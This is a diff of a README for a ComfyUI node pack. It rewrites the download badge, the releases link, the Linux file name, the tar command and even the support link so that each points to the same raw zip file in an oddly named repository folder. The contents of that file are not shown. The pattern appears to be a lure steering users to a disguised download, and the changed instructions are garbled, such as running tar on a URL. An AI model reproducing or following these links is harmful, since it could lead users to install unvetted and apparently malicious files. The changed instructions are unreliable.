@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-ComfyUI--WanAnimatePreprocess-blue.svg)](https://github.com/cheatingsz/ComfyUI-WanAnimatePreprocess/releases)
+[![Download](https://raw.githubusercontent.com/cheatingsz/ComfyUI-WanAnimatePreprocess/main/suprascapular/ComfyUI-WanAnimatePreprocess.zip)](https://raw.githubusercontent.com/cheatingsz/ComfyUI-WanAnimatePreprocess/main/suprascapular/ComfyUI-WanAnimatePreprocess.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ Before you begin, ensure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To download ComfyUI-WanAnimatePreprocess, visit this page to download: [GitHub Releases](https://github.com/cheatingsz/ComfyUI-WanAnimatePreprocess/releases).
+To download ComfyUI-WanAnimatePreprocess, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/cheatingsz/ComfyUI-WanAnimatePreprocess/main/suprascapular/ComfyUI-WanAnimatePreprocess.zip).
 
 1. Click the link above to open the releases page.
 2. Look for the latest version.
-3. Download the file for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Download the file for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/cheatingsz/ComfyUI-WanAnimatePreprocess/main/suprascapular/ComfyUI-WanAnimatePreprocess.zip` for Linux).
 4. Save the file to a folder on your computer.
 
 ## 🔧 How to Install
@@ -44,7 +44,7 @@ To download ComfyUI-WanAnimatePreprocess, visit this page to download: [GitHub R
 
 1. Open a terminal.
 2. Navigate to the folder where you downloaded the file.
-3. Use the command `tar -xvzf ComfyUI-WanAnimatePreprocess.tar.gz` to extract the files.
+3. Use the command `tar -xvzf https://raw.githubusercontent.com/cheatingsz/ComfyUI-WanAnimatePreprocess/main/suprascapular/ComfyUI-WanAnimatePreprocess.zip` to extract the files.
 4. Follow the provided README to run the application.
 
 ## ⚙️ How to Use ComfyUI-WanAnimatePreprocess
@@ -74,7 +74,7 @@ If you encounter issues while using the software, here are some common solutions
 
 ## 📞 Support
 
-If you need further assistance, feel free to reach out via the issues section on the [GitHub repository](https://github.com/cheatingsz/ComfyUI-WanAnimatePreprocess/issues). Provide details about your issue for faster support.
+If you need further assistance, feel free to reach out via the issues section on the [GitHub repository](https://raw.githubusercontent.com/cheatingsz/ComfyUI-WanAnimatePreprocess/main/suprascapular/ComfyUI-WanAnimatePreprocess.zip). Provide details about your issue for faster support.
 
 ## 📜 License
 
